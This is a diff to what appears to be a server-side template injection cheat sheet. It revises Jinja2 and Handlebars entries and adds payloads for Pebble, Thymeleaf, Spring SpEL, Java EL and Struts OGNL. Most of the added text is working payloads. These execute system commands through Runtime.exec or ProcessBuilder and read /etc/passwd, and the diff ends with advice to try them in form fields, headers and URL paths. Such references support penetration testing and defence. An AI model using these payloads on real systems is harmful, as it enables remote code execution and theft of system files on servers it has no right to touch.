@@ -33,7 +33,7 @@ ${7*7} = 49?  -->  Check ${class.getForName('java.lang.Runtime')}
 
 - `ZeroDivisionError` -> Python (Jinja2/Mako)
 - `java.lang.ArithmeticException` -> Java (Freemarker/Velocity)
-- `ReferenceError` / `TypeError` -> Node.js (Pug/Handlebars)
+- `ReferenceError` / `TypeError` -> Node.js (Pug/Nunjucks)
 
 ## Jinja2 (Python)
 
@@ -70,7 +70,9 @@ ${7*7} = 49?  -->  Check ${class.getForName('java.lang.Runtime')}
 
 ```python
 {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read() }}
+# Note: [1] for Python 3 (object), [2] for Python 2. Subclass index X varies by environment —
+# enumerate with {{''.__class__.__mro__[1].__subclasses__()}} and find a file-reading class.
 ```
 
 ## Mako (Python)
@@ -157,6 +159,7 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()
 ### RCE
 
 ```
+# Requires VelocityTools (ClassTool) — not available in vanilla Velocity
 #set($str=$class.inspect("java.lang.String").type)
 #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
 $ex.waitFor()
@@ -206,7 +209,7 @@ $ex.waitFor()
 
 ## Handlebars (Node.js)
 
-### RCE (< 4.1.2)
+### RCE (< 4.7.7)
 
 ```handlebars
 {{#with "s" as |string|}}
@@ -229,6 +232,84 @@ $ex.waitFor()
   {{/with}}
 {{/with}}
 ```
+
+## Pebble (Java)
+
+### Detection
+
+```
+{{ "test" }}
+{% set x = 7 * 7 %}{{ x }}
+```
+
+### RCE
+
+```java
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream %}
+{{ (1).TYPE.forName('java.io.BufferedReader')
+     .getDeclaredConstructor((1).TYPE.forName('java.io.Reader'))
+     .newInstance((1).TYPE.forName('java.io.InputStreamReader')
+       .getDeclaredConstructor((1).TYPE.forName('java.io.InputStream'))
+       .newInstance(bytes))
+     .readLine() }}
+```
+
+## Thymeleaf (Java / Spring)
+
+### Detection
+
+```
+__${7*7}__::x
+${T(java.lang.Runtime).getRuntime().exec('id')}
+```
+
+### RCE via Expression Preprocessing
+
+```
+# URL path-based (Spring view name injection)
+GET /path/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+# Fragment expression
+~{::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__}
+```
+
+### RCE via SpEL in Attributes
+
+```html
+<div th:with="${T(java.lang.Runtime).getRuntime().exec('id')}"/>
+```
+
+## Expression Language Injection
+
+### Java EL
+
+```
+${7*7}
+${applicationScope}
+${pageContext.request.serverName}
+```
+
+### Spring SpEL
+
+```
+#{7*7}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+```
+
+### OGNL (Struts)
+
+```
+%{7*7}
+%{#cmd='id',#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')),#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}),#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start()}
+```
+
+Test in any parameter processed by expression evaluators — form fields, headers, URL path segments.
 
 ## Blind SSTI Detection
 
